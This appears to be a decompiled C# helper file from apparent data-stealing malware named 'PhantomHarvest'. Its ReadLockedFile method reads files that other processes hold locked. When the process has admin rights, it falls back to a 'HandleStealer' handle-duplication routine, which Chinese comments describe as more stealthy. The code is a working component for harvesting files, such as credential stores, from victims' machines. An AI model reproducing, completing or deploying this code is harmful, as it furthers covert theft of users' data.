using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace PhantomHarvest.Helper
{
	// Token: 0x02000028 RID: 40
	internal class LockedFile
	{
		// Token: 0x060000ED RID: 237 RVA: 0x0000A324 File Offset: 0x00008524
		public static byte[] ReadLockedFile(string fileName)
		{
			try
			{
				// 【优先策略】首先尝试 FileShare.ReadWrite（快速、可靠）
				try
				{
					using (FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
					{
						byte[] array = new byte[fileStream.Length];
						int bytesRead = fileStream.Read(array, 0, (int)fileStream.Length);
						
						// 验证读取完整性
						if (bytesRead == fileStream.Length && bytesRead > 0)
						{
							return array;
						}
					}
				}
				catch
				{
					// FileShare 失败，继续尝试 HandleStealer
				}

				// 【Fallback策略】如果是管理员且FileShare失败，使用句柄复制
				// 这个方法更隐蔽但性能开销大，仅作为后备方案
				if (HandleStealer.IsAdmin())
				{
					byte[] stealthyContent = HandleStealer.GetFileContentViaHandleDuplication(fileName);
					if (stealthyContent != null && stealthyContent.Length > 0) 
					{
						return stealthyContent;
					}
				}

				return null;
			}
			catch
			{
				return null;
			}
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000A3D0 File Offset: 0x000085D0
	}
}
